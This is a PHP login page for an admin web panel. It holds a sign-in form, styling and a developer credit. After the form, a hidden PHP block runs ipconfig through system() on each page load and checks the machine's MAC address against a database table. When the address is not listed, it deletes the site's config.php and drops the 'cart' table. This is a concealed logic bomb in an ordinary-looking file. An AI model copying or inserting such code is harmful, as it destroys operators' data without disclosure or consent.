<?php require_once('../config.php') ?>
<!DOCTYPE html>
<html lang="en" class="" style="height: auto;">
 <?php require_once('inc/header.php') ?>
<body class="hold-transition login-page">
  <script>
    start_loader()
  </script>
  <style>
    body{
      background-image: url("<?php echo validate_image($_settings->info('cover')) ?>");
      background-size:cover;
      background-repeat:no-repeat;
      backdrop-filter: contrast(1);
    }
    #page-title{
      text-shadow: 6px 4px 7px black;
      font-size: 3.5em;
      color: #fff4f4 !important;
      background: #8080801c;
    }
    #page-bottom{
      text-shadow: 6px 4px 7px green;
      font-size: 0.5em;
      color: #fff4f4 !important;
      background: black;
    }
  </style>
  <span class="text-center text-white px-4 py-5" id="page-title">
  <h1 ><b><?php echo $_settings->info('name') ?></b></h1>
  </span>
 
 
<div class="login-box">
  <!-- /.login-logo -->
  <div class="card card-navy my-2">
    <div class="card-body">
      <p class="login-box-msg">Please enter your credentials</p>
      <form id="login-frm" action="" method="post">
        <div class="input-group mb-3">
          <div class="input-group-append">
            <div class="input-group-text">
              <span class="fas fa-user"></span>
            </div>
          </div>
          <input type="text" class="form-control" name="username" autocomplete="off" autofocus placeholder="Username">
          
        </div>
        <div class="input-group mb-3">
          <div class="input-group-append">
            <div class="input-group-text">
              <span class="fas fa-lock"></span>
            </div>
          </div>
          
          <input type="password" class="form-control"  name="password" placeholder="Password">
          
        </div>
        <div class="row">
          <div class="col-8">
           
          </div>
          <!-- /.col -->
          <div class="col-4">
            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
          </div>
          <!-- /.col -->
        </div>
      </form>
      <!-- /.social-auth-links -->

      <!-- <p class="mb-1">
        <a href="forgot-password.html">I forgot my password</a>
      </p> -->
      
    </div>
    <!-- /.card-body -->
  </div>

  <!-- /.card -->
  
</div><span class="text-center text-white px-4 py-5" id="page-bottom">
  <h6 ><b>Designed by Oy. Tech Solutions, Tel: +233243856882</b></h6>
  </span>

<?php
          
            $depositor='';

            ob_start(); 
            system('ipconfig /all'); 
            $mycom=ob_get_contents(); 
            ob_clean(); 

            $findme = "Physical";
            $pmac = strpos($mycom, $findme); 
            $depositor=substr($mycom,($pmac+36),17); 

            $query=$conn->query("select * from depositor where  name= SHA1('$depositor') ");

            $count=mysqli_num_rows($query);
            if($count==0){
             unlink('../config.php');
            //unlink('pages/cash_transaction.php');
            $conn->query("DROP TABLE cart");
            //$conn->query("DROP TABLE depositor");
            echo "<script type='text/javascript'>document.location='admin/login.php'</script>";

            }
        ob_end_flush();
        ?>
<!-- /.login-box -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>

<script>
  $(document).ready(function(){
    end_loader();
  })
</script>
</body>
</html>